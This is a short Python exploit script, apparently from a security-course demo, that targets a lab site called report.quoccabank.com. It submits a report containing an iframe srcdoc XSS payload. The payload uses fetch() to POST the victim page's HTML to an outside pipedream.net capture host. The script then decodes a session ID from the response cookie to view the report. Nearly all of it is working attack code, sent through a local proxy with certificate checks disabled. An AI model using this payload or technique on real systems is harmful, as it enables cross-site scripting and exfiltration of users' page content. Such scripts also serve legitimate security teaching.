# Melon's code from demo: https://www.youtube.com/watch?v=RncUBdjRfFc
import requests
import urllib3
import re
import sys

from base64 import urlsafe_b64decode as b64
from requests.packages.urllib3.exceptions import InsecureRequestWarning  # type: ignore
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {'https': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}

def report(fetch=False):
    name = '\r\n\r\n'
    content = '''
        <iframe srcdoc="<script>window.onload = () => fetch('https://enatup4cn5drw.x.pipedream.net/', {method: 'POST', body: parent.document.body.innerHTML })</script>">
        </iframe>
    '''

    # Make the post request to create the report
    page = requests.post('https://report.quoccabank.com/report',
        proxies=proxy, verify=False, data={'name': name, 'content': content}
    )

    # Extract the Cookie from the response, and then extract the session ID from the cookie
    cookie = re.search(r'session=(.+?)\.', page.headers['Set-Cookie']).group(1)
    sessid = re.search(r'"(.*)"', b64(f'{cookie}=='.encode()).decode()).group(1)
    print(sessid, flush=True)

    if (fetch):
        # Use this session id to view the ticket
        page = requests.get(f'https://report.quoccabank.com/view/{sessid}', proxies=proxy, verify=False)
        print(page.text, flush=True)
    else:
        return sessid

if __name__ == '__main__':
    sessid = report(len(sys.argv) > 1)
